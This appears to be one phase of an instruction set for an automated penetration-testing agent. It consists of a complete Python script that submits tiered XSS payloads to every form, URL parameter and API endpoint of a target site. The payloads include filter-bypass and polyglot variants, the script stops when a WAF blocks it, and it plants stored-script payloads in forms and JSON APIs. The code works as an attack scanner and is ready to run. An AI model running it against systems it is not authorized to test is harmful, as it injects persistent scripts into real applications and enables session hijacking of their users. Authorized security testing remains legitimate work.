**Phase 5 — Cross-Site Scripting (XSS)**

  This phase tests EVERY form and EVERY URL parameter for reflected and stored XSS.
  Run this as ONE complete run_python block. It iterates ALL forms automatically.

  ```python
  import time, re
  from urllib.parse import urljoin, urlparse, parse_qs

  BASE    = _G['BASE']
  session = _G.get('session_a') or _G.get('session')
  AUTH_FORMS  = _G.get('AUTH_FORMS', [])
  ALL_FORMS   = _G.get('ALL_FORMS', [])
  AUTH_PARAMS = _G.get('AUTH_PARAMS', [])
  DELAY = 0.5

  # ── XSS Payloads (tiered: basic → context → bypass → polyglot) ─────────────
  BASIC_XSS = [
      '<script>alert(1)</script>',
      '<img src=x onerror=alert(1)>',
      '<svg onload=alert(1)>',
  ]
  CONTEXT_XSS = [
      '"><script>alert(1)</script>',
      "'><script>alert(1)</script>",
      '"><img src=x onerror=alert(1)>',
      '" onfocus=alert(1) autofocus="',
      '</textarea><script>alert(1)</script>',
      '</title><script>alert(1)</script>',
      'javascript:alert(1)',
  ]
  BYPASS_XSS = [
      '<ScRiPt>alert(1)</ScRiPt>',
      '<img src=x onerror=alert`1`>',
      '<svg/onload=alert(1)>',
      '<details open ontoggle=alert(1)>',
      '<input onfocus=alert(1) autofocus>',
      '<iframe src="javascript:alert(1)">',
      '<body onload=alert(1)>',
      '<img/src="x"/onerror=alert(1)>',
  ]
  POLYGLOT_XSS = [
      "'-alert(1)-'",
      '</script><svg onload=alert(1)>',
      '<img src=x onerror="javascript:alert(1)">',
  ]
  ALL_XSS = BASIC_XSS + CONTEXT_XSS + BYPASS_XSS + POLYGLOT_XSS

  def check_waf(r):
      if r.status_code == 429:
          return True
      if r.status_code in (403, 406, 503):
          waf = ['cloudflare','waf','firewall','blocked','forbidden','mod_security']
          if any(w in r.text.lower() for w in waf):
              return True
      return False

  xss_findings = []

  # ═══════════════════════════════════════════════════════════════════
  # PART A — REFLECTED XSS: Test every form field
  # ═══════════════════════════════════════════════════════════════════
  all_forms = AUTH_FORMS + ALL_FORMS
  print(f"[XSS] Testing {len(all_forms)} forms for reflected XSS")

  for form in all_forms:
      action = form.get('action', BASE)
      method = form.get('method', 'get').lower()
      fields = form.get('fields', [])
      url = action if action.startswith('http') else urljoin(BASE, action)

      text_fields = [f for f in fields
                     if f.get('type', 'text') not in ('submit','hidden','checkbox','radio','file','button')]
      if not text_fields:
          continue

      print(f"\n  Form: {method.upper()} {url}  fields={[f['name'] for f in text_fields]}")

      for field in text_fields:
          fname = field['name']

          # Step 1: Probe — does the input get reflected at all?
          probe = 'xSsProBe7x7q'
          data_probe = {f['name']: f.get('value', '') or 'test' for f in fields}
          data_probe[fname] = probe
          try:
              if method == 'post':
                  r_probe = session.post(url, data=data_probe, timeout=10, allow_redirects=True)
              else:
                  r_probe = session.get(url, params=data_probe, timeout=10, allow_redirects=True)
          except Exception:
              continue

          if probe not in r_probe.text:
              print(f"    {fname}: not reflected — skip")
              continue

          # Detect context
          idx = r_probe.text.find(probe)
          before = r_probe.text[max(0,idx-50):idx]
          if 'value="' in before or "value='" in before:
              payloads = CONTEXT_XSS + BYPASS_XSS + POLYGLOT_XSS
              ctx = 'ATTRIBUTE'
          elif '<script' in before.lower():
              payloads = ["'-alert(1)-'", "</script><svg onload=alert(1)>"]
              ctx = 'SCRIPT'
          else:
              payloads = ALL_XSS
              ctx = 'HTML_BODY'
          print(f"    {fname}: REFLECTED in {ctx} context — testing {len(payloads)} payloads")

          # Step 2: Test payloads
          confirmed = False
          for payload in payloads:
              time.sleep(DELAY)
              data = {f['name']: f.get('value', '') or 'test' for f in fields}
              data[fname] = payload
              try:
                  if method == 'post':
                      r = session.post(url, data=data, timeout=10, allow_redirects=True)
                  else:
                      r = session.get(url, params=data, timeout=10, allow_redirects=True)
              except Exception:
                  continue
              if check_waf(r):
                  print(f"    {fname}: WAF blocked — stopping")
                  break

              if payload in r.text:
                  print(f"[HIGH] Reflected XSS CONFIRMED: {url} param={fname}")
                  print(f"  Payload: {payload}")
                  pi = r.text.find(payload[:15])
                  print(f"  Context: ...{r.text[max(0,pi-80):pi+120]}...")
                  xss_findings.append({
                      'type': 'reflected', 'url': url, 'param': fname,
                      'payload': payload, 'method': method.upper(),
                      'evidence': r.text[max(0,pi-80):pi+200],
                  })
                  confirmed = True
                  break
              elif '&lt;script&gt;' in r.text or '&lt;img' in r.text:
                  continue  # encoded, try next payload
          if not confirmed:
              print(f"    {fname}: all payloads filtered/encoded")

  # ═══════════════════════════════════════════════════════════════════
  # PART B — REFLECTED XSS: Test URL parameters from crawl + spider
  # ═══════════════════════════════════════════════════════════════════
  # Combine AUTH_PARAMS (auth crawl) + ALL_LINKS (unauth spider) for full coverage
  _xss_params = list(AUTH_PARAMS)
  _xss_seen = set((p['url'].split('?')[0], p['param']) for p in AUTH_PARAMS)
  for _link in _G.get('ALL_LINKS', set()):
      if '?' in _link:
          _lbase = _link.split('?')[0]
          for _pn, _pv in parse_qs(urlparse(_link).query).items():
              if (_lbase, _pn) not in _xss_seen:
                  _xss_params.append({'url': _link, 'param': _pn, 'value': _pv[0]})
                  _xss_seen.add((_lbase, _pn))
  print(f"\n[XSS] Testing {len(_xss_params)} URL parameters for reflected XSS")

  for param_info in _xss_params:
      purl = param_info['url'].split('?')[0]
      pname = param_info['param']

      probe = 'xSsProBe7x7q'
      try:
          r_probe = session.get(purl, params={pname: probe}, timeout=10)
      except Exception:
          continue
      if probe not in r_probe.text:
          continue

      print(f"  {purl} ?{pname}= REFLECTED — testing payloads")
      for payload in ALL_XSS:
          time.sleep(DELAY)
          try:
              r = session.get(purl, params={pname: payload}, timeout=10)
          except Exception:
              continue
          if check_waf(r):
              break
          if payload in r.text:
              print(f"[HIGH] Reflected XSS: {purl} ?{pname}=")
              print(f"  Payload: {payload}")
              xss_findings.append({
                  'type': 'reflected', 'url': purl, 'param': pname,
                  'payload': payload, 'method': 'GET',
              })
              break

  # ═══════════════════════════════════════════════════════════════════
  # PART C — STORED XSS: Test POST forms that store data
  # ═══════════════════════════════════════════════════════════════════
  # Test ALL POST forms for stored XSS (not just keyword-matching ones)
  stored_forms = [f for f in all_forms if f.get('method','get').lower() == 'post']

  print(f"\n[XSS] Testing {len(stored_forms)} POST forms for stored XSS")
  STORED_PAYLOAD = '<script>alert("STORED_XSS_PROOF")</script>'
  MARKER = 'STORED_XSS_PROOF'

  # Collect ALL display pages to check after injection (cross-page stored XSS)
  _all_display_pages = set()
  for f in all_forms:
      _all_display_pages.add(f.get('page', f.get('action', BASE)))
  for p in list(_G.get('AUTH_PAGES', {}).keys())[:20]:
      _all_display_pages.add(p)
  # Also check API endpoints (SPAs render data from /api/ responses)
  for _link in list(_G.get('ALL_LINKS', set()))[:30]:
      if '/api/' in _link or '/rest/' in _link:
          _all_display_pages.add(_link)
  # Check common display pages where stored content renders
  for _dp in ['/comments', '/reviews', '/feedback', '/messages', '/posts',
              '/admin', '/dashboard', '/users', '/profile', '/search']:
      _all_display_pages.add(BASE.rstrip('/') + _dp)

  for form in stored_forms:
      action = form['action']
      page = form.get('page', action)
      fields = form.get('fields', [])
      text_fields = [f for f in fields
                     if f.get('type','text') not in ('submit','hidden','file','checkbox','radio','button')]
      if not text_fields:
          continue

      print(f"  Stored XSS: POST {action} → checking {len(_all_display_pages)} pages")

      for field in text_fields:
          fname = field['name']
          data = {f['name']: f.get('value', '') or 'test' for f in fields}
          data[fname] = STORED_PAYLOAD
          found = False
          try:
              session.post(action, data=data, timeout=10, allow_redirects=True)
              time.sleep(0.5)
              # Check MULTIPLE pages — stored content may render elsewhere
              for check_page in [page, action] + list(_all_display_pages)[:15]:
                  try:
                      r_disp = session.get(check_page, timeout=10, allow_redirects=True)
                  except Exception:
                      continue
                  if STORED_PAYLOAD in r_disp.text:
                      print(f"[HIGH] Stored XSS CONFIRMED: {action} field={fname}")
                      print(f"  Payload renders unescaped on: {check_page}")
                      xss_findings.append({
                          'type': 'stored', 'url': action, 'param': fname,
                          'payload': STORED_PAYLOAD, 'display_page': check_page,
                      })
                      found = True
                      break
                  elif MARKER in r_disp.text and '&lt;script&gt;' not in r_disp.text:
                      print(f"[HIGH] Stored XSS CONFIRMED (marker present): {fname} on {check_page}")
                      xss_findings.append({
                          'type': 'stored', 'url': action, 'param': fname,
                          'payload': STORED_PAYLOAD, 'display_page': check_page,
                      })
                      found = True
                      break
          except Exception:
              continue
          if found:
              break
          else:
              print(f"    {fname}: payload not found on any display page")

  # ═══════════════════════════════════════════════════════════════════
  # PART D — STORED XSS via REST API (JSON POST with XSS in values)
  # ═══════════════════════════════════════════════════════════════════
  # SPAs often accept JSON — inject XSS in string fields via API
  api_write_endpoints = []
  for _link in _G.get('ALL_LINKS', set()):
      if '/api/' in _link or '/rest/' in _link:
          api_write_endpoints.append(_link.split('?')[0])
  api_write_endpoints = list(set(api_write_endpoints))[:15]

  if api_write_endpoints:
      print(f"\n[XSS] Testing {len(api_write_endpoints)} API endpoints for stored XSS via JSON")
      _API_XSS_MARKER = 'XSS_API_STORED_PROOF_42'
      _API_XSS_PAYLOAD = f'<iframe src="javascript:alert(\'{_API_XSS_MARKER}\')"></iframe>'
      _GENERIC_FIELDS = ['comment', 'message', 'text', 'body', 'content', 'name',
                         'title', 'description', 'feedback', 'review', 'note', 'query']
      for _api_url in api_write_endpoints:
          for _field in _GENERIC_FIELDS:
              time.sleep(0.3)
              try:
                  _r = session.post(_api_url, json={_field: _API_XSS_PAYLOAD}, timeout=10,
                                    headers={'Content-Type': 'application/json'})
                  if _r.status_code in (200, 201):
                      # Check if the XSS payload is returned unescaped in the response
                      if _API_XSS_PAYLOAD in _r.text or _API_XSS_MARKER in _r.text:
                          print(f"[HIGH] Stored XSS via API: POST {_api_url} field={_field}")
                          print(f"  Payload returned unescaped in JSON response")
                          xss_findings.append({
                              'type': 'stored-api', 'url': _api_url, 'param': _field,
                              'payload': _API_XSS_PAYLOAD, 'method': 'POST (JSON)',
                          })
                          break
                      # Also GET the same endpoint to see if stored
                      _rg = session.get(_api_url, timeout=10)
                      if _API_XSS_PAYLOAD in _rg.text:
                          print(f"[HIGH] Stored XSS via API: {_api_url} field={_field} (persisted)")
                          xss_findings.append({
                              'type': 'stored-api', 'url': _api_url, 'param': _field,
                              'payload': _API_XSS_PAYLOAD, 'method': 'POST (JSON)',
                          })
                          break
              except Exception:
                  continue

  # ═══════════════════════════════════════════════════════════════════
  # SUMMARY
  # ═══════════════════════════════════════════════════════════════════
  print(f"\n=== XSS SUMMARY: {len(xss_findings)} confirmed ===")
  for f in xss_findings:
      print(f"  [{f['type'].upper()}] {f.get('method','POST')} {f['url']} — {f['param']}: {f['payload'][:50]}")
  _G['XSS_FINDINGS'] = xss_findings

  # Also store in main FINDINGS for PDF report
  _G.setdefault('FINDINGS', [])
  for _xf in xss_findings:
      _G['FINDINGS'].append({
          'severity': _xf.get('severity', 'HIGH'),
          'title': f"XSS ({_xf.get('type','XSS')}) — {_xf.get('param','')} via {_xf.get('method','?')}",
          'url': _xf.get('url', ''),
          'method': _xf.get('method', 'GET'),
          'parameter': _xf.get('param', ''),
          'payload': _xf.get('payload', ''),
          'evidence': _xf.get('evidence', ''),
          'request': _xf.get('request', ''),
          'response': _xf.get('response', ''),
          'impact': 'Session hijacking, credential theft, defacement via cross-site scripting',
      })
  ```
